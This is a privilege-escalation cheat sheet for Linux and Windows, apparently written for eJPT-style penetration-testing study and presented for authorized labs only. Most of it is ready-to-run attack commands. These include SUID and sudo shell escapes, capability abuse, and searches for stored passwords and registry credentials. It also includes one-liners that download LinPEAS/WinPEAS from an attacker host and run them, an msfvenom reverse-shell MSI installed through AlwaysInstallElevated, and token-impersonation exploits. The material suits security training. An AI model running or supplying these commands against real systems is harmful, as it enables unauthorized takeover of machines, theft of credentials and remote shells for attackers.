# Privilege Escalation — Linux & Windows Cheat Sheet

A dedicated, checklist-style reference for turning a low-privilege shell into root/SYSTEM — the enumeration steps to run first, and the exact command for each common misconfiguration.

> All techniques below are for use in **authorized environments only** — personal labs, CTFs, and engagements covered by written authorization (RoE).

---

## PART 1 — Linux

### 1.1 First 60 Seconds of Enumeration

```bash
id; hostname; uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.daily 2>/dev/null
cat ~/.bash_history 2>/dev/null
getcap -r / 2>/dev/null
```

Or run an automated sweep once you've looked manually (don't rely on it blindly):
```bash
curl http://LHOST:PORT/linpeas.sh | bash
```

### 1.2 SUID / SGID Binaries

Check every SUID hit against [GTFOBins](https://gtfobins.github.io/). Fast wins:

| Binary | Command |
|---|---|
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python3` | `python3 -c 'import os;os.execl("/bin/sh","sh","-p")'` |
| `less`/`more` | `!/bin/sh` from within the pager |
| `cp` | overwrite `/etc/passwd` with a new root-equivalent entry |

### 1.3 Sudo Misconfigurations

```bash
sudo -l
```
Match the output against GTFOBins' "sudo" column — most binaries listed with `NOPASSWD:` next to them have a documented one-liner to root.

### 1.4 Cron Jobs

- Look for cron jobs pointing at **world-writable** scripts (`ls -la` on the script path).
- Look for cron jobs referencing a binary via a **relative path** or without a full path — combine with a `PATH` hijack (see 1.6).

### 1.5 Kernel & Service Exploits

```bash
uname -a                       # match against searchsploit / known CVEs
searchsploit linux kernel <version>
```
Common ones worth checking version against: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), PwnKit (CVE-2021-4034 — `pkexec`), Sudo Baron Samedit (CVE-2021-3156).

### 1.6 PATH / Environment Abuse

If a SUID binary or cron job calls another binary **without an absolute path**, and a writable directory appears earlier in `$PATH`:
```bash
echo $PATH
# place a malicious binary with the called name in a writable, earlier PATH entry
```

### 1.7 Capabilities

```bash
getcap -r / 2>/dev/null
```
`cap_setuid+ep` on `python3`, for example: `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

### 1.8 NFS `no_root_squash`

```bash
cat /etc/exports    # if reachable
```
If an NFS share has `no_root_squash`, mount it from your attack box, create a SUID binary as root locally, then execute it from the target.

---

## PART 2 — Windows

### 2.1 First 60 Seconds of Enumeration

```powershell
whoami /priv
whoami /groups
systeminfo
net user; net localgroup administrators
```

Or run an automated sweep:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/winPEAS.ps1')
```

### 2.2 AlwaysInstallElevated

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
If both are `1`, generate a malicious MSI:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi
```
Then: `msiexec /quiet /qn /i evil.msi`

### 2.3 Unquoted Service Paths

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"
```
A path like `C:\Program Files\Some App\service.exe` with no quotes lets you drop `C:\Program.exe` if that directory is writable.

### 2.4 Weak Service Permissions

```powershell
accesschk.exe -uwcqv "Authenticated Users" *
```
Look for services where the current user can modify the binary path or restart the service.

### 2.5 Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
```
Check for tasks running as SYSTEM/admin that call a writable script or binary.

### 2.6 Token Impersonation (SeImpersonatePrivilege)

If `whoami /priv` shows `SeImpersonatePrivilege` enabled, use a Potato-family exploit:
```powershell
# JuicyPotato / PrintSpoofer / RoguePotato depending on OS build
PrintSpoofer.exe -i -c cmd
```

### 2.7 Credentials Lying Around

```powershell
dir /s /b *pass* == *.config *.xml *.txt 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
findstr /si password *.xml *.ini *.txt 2>nul
```

### 2.8 Kernel Exploits

```powershell
systeminfo
```
Match the build number against known local privesc CVEs (use `Watson` or `Sherlock` to automate the comparison) — last resort if the above configuration checks come up empty.

---

## Priority Order (Both OSes)

1. Manual quick checks (60-second enumeration) — always first, cheapest signal.
2. Anything with a **documented one-liner** (SUID/GTFOBins, sudo, AlwaysInstallElevated) — near-zero risk of breaking the box.
3. Configuration abuse (unquoted paths, weak service perms, writable cron/scheduled tasks) — reliable, a bit more setup.
4. Automated enumeration scripts (LinPEAS/WinPEAS) — good for catching what manual checks missed, but read the output, don't just run exploits blindly.
5. Kernel/CVE exploitation — last resort; higher chance of crashing the target.

---

*Prepared for eJPT-aligned post-exploitation work. Use only in authorized environments.*
